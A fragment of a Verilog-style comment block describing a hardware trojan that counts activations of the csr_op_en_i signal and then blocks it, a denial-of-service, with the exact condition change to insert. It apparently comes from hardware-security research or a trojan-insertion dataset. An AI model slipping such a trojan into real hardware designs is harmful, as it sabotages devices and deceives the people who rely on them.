 ...
 * 
 * Description:
 *   Disables operations by blocking csr_op_en_i control signal
 *   
 * Trigger: Counter on csr_op_en_i
 * Payload: Block csr_op_en_i when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block csr_op_en_i when trojan is active
//
// IMPORTANT: csr_op_en_i is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (csr_op_en_i && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: csr_op_en_i && 0 = 0 (always false)
//   All operations controlled by csr_op_en_i are blocked
